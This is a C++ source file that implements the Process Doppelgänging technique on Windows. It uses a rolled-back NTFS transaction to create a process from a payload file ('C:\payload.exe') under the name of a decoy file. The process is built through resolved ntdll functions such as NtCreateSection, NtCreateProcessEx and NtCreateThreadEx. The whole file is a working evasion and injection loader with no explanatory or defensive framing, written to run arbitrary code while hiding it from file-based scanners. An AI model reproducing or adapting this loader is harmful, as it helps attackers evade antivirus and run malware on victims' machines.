#include <iostream>
#include <Windows.h>
#include <ktmw32.h>
#include <winternl.h>
#include "header.h"

#pragma comment(lib, "KtmW32.lib")
#define PS_INHERIT_HANDLES 4
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001

LPCWSTR target = L"C:\\doppelganger.exe";
LPCWSTR payload = L"C:\\payload.exe";  // 64 bit image for 64 bit systems
NTCREATESECTION NtCreateSection = nullptr;
NTCREATEPROCESSEX NtCreateProcessEx = nullptr;
NTQUERYINFORMATIONPROCESS NtQueryInfoProcess = nullptr;
NTREADVIRTUALMEMORY NtReadVirtualMemory = nullptr;
NTWRITEVIRTUALMEMORY NtWriteVirtualMemory = nullptr;
RTLCREATEPROCESSPARAMETERSEX RtlCreateProcessParametersEx = nullptr;
NTCREATETHREADEX NtCreateThreadEx = nullptr;
RTLINITUNICODESTRING RtlInitUnicodeStr = nullptr;
NTRESUMETHREAD NtResumeThread = nullptr;


LPVOID copy_payload(DWORD& buffersize)
{
	LARGE_INTEGER payloadsize;

	HANDLE payloadfile = CreateFile(
		payload,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if(payloadfile == INVALID_HANDLE_VALUE)
	{
		std::cout << "CreateFile Failed" << std::endl;
		return nullptr;
	}

	if(!GetFileSizeEx(payloadfile, &payloadsize))
	{
		std::cout << "GetFileSizeEx Failed" << std::endl;
		return nullptr;
	}

	buffersize = payloadsize.LowPart;

	LPVOID buffer = VirtualAlloc(NULL, buffersize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if(buffer == NULL)
	{
		std::cout << "VirtualAlloc Failed" << std::endl;
		return nullptr;
	}

	if(!ReadFile(payloadfile, buffer, buffersize, 0, NULL))
	{
		std::cout << "ReadFile Failed" << std::endl;
		return nullptr;
	}
	
	CloseHandle(payloadfile);
	return buffer;
}

bool resolve_nt()
{
	HMODULE ntdll = LoadLibrary(L"ntdll");
	if(ntdll == NULL)
	{
		std::cout << "LoadLibrary Failed" << std::endl;
		return false;
	}

	NtCreateSection = (NTCREATESECTION)GetProcAddress(ntdll, "NtCreateSection");
	if(NtCreateSection == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of NtCreateSection" << std::endl;
		return false;
	}

	NtCreateProcessEx = (NTCREATEPROCESSEX)GetProcAddress(ntdll, "NtCreateProcessEx");
	if(NtCreateProcessEx == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of NtCreateProcessEx" << std::endl;
		return false;
	}

	NtQueryInfoProcess = (NTQUERYINFORMATIONPROCESS)GetProcAddress(ntdll, "NtQueryInformationProcess");
	if(NtQueryInfoProcess == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of NtQueryInformationProcess" << std::endl;
		return false;
	}

	NtReadVirtualMemory = (NTREADVIRTUALMEMORY)GetProcAddress(ntdll, "NtReadVirtualMemory");
	if(NtReadVirtualMemory == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of NtReadVirtualMemory" << std::endl;
		return false;
	}

	NtWriteVirtualMemory = (NTWRITEVIRTUALMEMORY)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	if(NtWriteVirtualMemory == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of NtWriteVirtualMemory" << std::endl;
		return false;
	}

	RtlCreateProcessParametersEx = (RTLCREATEPROCESSPARAMETERSEX)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
	if(RtlCreateProcessParametersEx == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of RtlCreateProcessParametersEx" << std::endl;
		return false;
	}

	NtCreateThreadEx = (NTCREATETHREADEX)GetProcAddress(ntdll, "NtCreateThreadEx");
	if(NtCreateThreadEx == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of NtCreateThreadEx" << std::endl;
		return false;
	}

	RtlInitUnicodeStr = (RTLINITUNICODESTRING)GetProcAddress(ntdll, "RtlInitUnicodeString");
	if(RtlInitUnicodeStr == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of RtlInitUnicodeString" << std::endl;
		return false;
	}

	NtResumeThread = (NTRESUMETHREAD)GetProcAddress(ntdll, "NtResumeThread");
	if(NtResumeThread == NULL)
	{
		std::cout << "GetProcAddress Failed to retrieve the address of NtResumeThread" << std::endl;
		return false;
	}

	FreeLibrary(ntdll);
	return true;
}

int main()
{
	if(!resolve_nt())
	{
		system("pause");
		return 1;
	}

	HANDLE hTransact = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if(hTransact == INVALID_HANDLE_VALUE)
	{
		std::cout << "CreateTransaction Failed" << std::endl;
		system("pause");
		return 1;
	}

	HANDLE hFile = CreateFileTransacted(
		target,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL,
		hTransact,
		NULL,
		NULL
		);

	if(hFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "CreateFileTransacted Failed" << std::endl;
		system("pause");
		return 1;
	}

	// Copying the payload to buffer and then buffer will be copied to the transacted file

	DWORD buffersize;
	LPVOID buffer = copy_payload(buffersize); // param passed with reference
	if(buffer == nullptr)
	{
		std::cout << "Failed to read the payload file" << std::endl;
		system("pause");
		return 1;
	}
	
	if(!WriteFile(hFile, buffer, buffersize, 0, 0))
	{
		std::cout << "WriteFile Failed" << std::endl;
		system("pause");
		return 1;
	}

	HANDLE hSection;
	if(!NT_SUCCESS(NtCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		NULL,
		PAGE_READONLY,
		SEC_IMAGE,
		hFile)))
	{
		std::cout << "NtCreateSection Failed" << std::endl;
		system("pause");
		return 1;
	}

	if(!RollbackTransaction(hTransact))
	{
		std::cout << "RollbackTransaction Failed" << std::endl;
		system("pause");
		return 1;
	}

	HANDLE hProcess;
	if (!NT_SUCCESS(NtCreateProcessEx(
		&hProcess,
		PROCESS_ALL_ACCESS,
		NULL,
		GetCurrentProcess(),
		PS_INHERIT_HANDLES,
		hSection,
		NULL,NULL, FALSE)))
	{
		std::cout << "NtCreateProcessEx Failed" << std::endl;
		system("pause");
		return 1;
	}

	PROCESS_BASIC_INFORMATION hProcessInfo;
	if (!NT_SUCCESS(NtQueryInfoProcess(
		hProcess,
		ProcessBasicInformation,
		&hProcessInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		NULL
	)))
	{
		std::cout << "NtQueryInformationProcess Failed" << std::endl;
		system("pause");
		return 1;
	}

	PEB remotePEB;
	if (!NT_SUCCESS(NtReadVirtualMemory(
		hProcess,
		hProcessInfo.PebBaseAddress,
		&remotePEB,
		sizeof(PEB),
		NULL
	)))
	{
		std::cout << "NtReadVirtualMemory failed to read remote process's PEB" << std::endl;
		system("pause");
		return 1;
	}

	IMAGE_DOS_HEADER dosHeader;
	IMAGE_NT_HEADERS ntHeader;

	if (!NT_SUCCESS(NtReadVirtualMemory(
		hProcess,
		remotePEB.Reserved3[1],    // ImageBase of remote process
		&dosHeader,
		sizeof(IMAGE_DOS_HEADER),
		NULL
	)))
	{
		std::cout << "NtReadVirtualMemory failed to read remote process's DOS headers" << std::endl;
		system("pause");
		return 1;
	}

	if (!NT_SUCCESS(NtReadVirtualMemory(
		hProcess,
		PVOID((LONGLONG)remotePEB.Reserved3[1] + dosHeader.e_lfanew),
		&ntHeader,
		sizeof(IMAGE_NT_HEADERS),
		NULL
	)))
	{
		std::cout << "NtReadVirtualMemory failed to read remote process's NT headers" << std::endl;
		system("pause");
		return 1;
	}
	
	LONGLONG entryPoint = (LONGLONG)remotePEB.Reserved3[1] + ntHeader.OptionalHeader.AddressOfEntryPoint;
	UNICODE_STRING str;
	RtlInitUnicodeStr(&str, target);
	PRTL_USER_PROCESS_PARAMETERS_DUPLICATE params;

	HANDLE hThread;
	if (!NT_SUCCESS(NtCreateThreadEx(                // CREATING THREAD IN SUSPENDED STATE
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		(LPTHREAD_START_ROUTINE)entryPoint,
		NULL,
		TRUE,
		NULL, NULL, NULL, NULL)))
	{
		std::cout << "NtCreateThreadEx failed" << std::endl;
		system("pause");
		return 1;
	}

	if (!NT_SUCCESS(RtlCreateProcessParametersEx(
		&params,
		&str,
		NULL,
		&str,
		NULL, NULL, NULL, NULL, NULL, NULL,
		RTL_USER_PROC_PARAMS_NORMALIZED
	)))
	{
		std::cout << "RtlCreateProcessParametersEx Failed" << std::endl;
		system("pause");
		return 1;
	}

	if(VirtualAllocEx(
		hProcess,
		params,
		params->Length,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE) == NULL)
	{
		std::cout << "VirtualAllocEx Failed" << std::endl;
		system("pause");
		return 1;
	}

	if (!NT_SUCCESS(NtWriteVirtualMemory(
		hProcess,
		params,
		params,
		params->Length,
		NULL
	)))
	{
		std::cout << "NtWriteVirtualMemory Failed to write params to remote process" << std::endl;
		system("pause");
		return 1;
	}

	PPEB peb = hProcessInfo.PebBaseAddress;
	if (!NT_SUCCESS(NtWriteVirtualMemory(
		hProcess,
		&(peb->ProcessParameters),
		&params,
		sizeof(PVOID),
		NULL
	)))
	{
		std::cout << "NtWriteVirtualMemory Failed to write base address of params to remote PEB" << std::endl;
		system("pause");
		return 1;
	}

	if(!NT_SUCCESS(NtResumeThread(hThread, NULL)))
	{
		std::cout << "NtResumeThread Failed" << std::endl;
		system("pause");
		return 1;
	}

	CloseHandle(hTransact);
	CloseHandle(hFile);
	CloseHandle(hSection);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;
}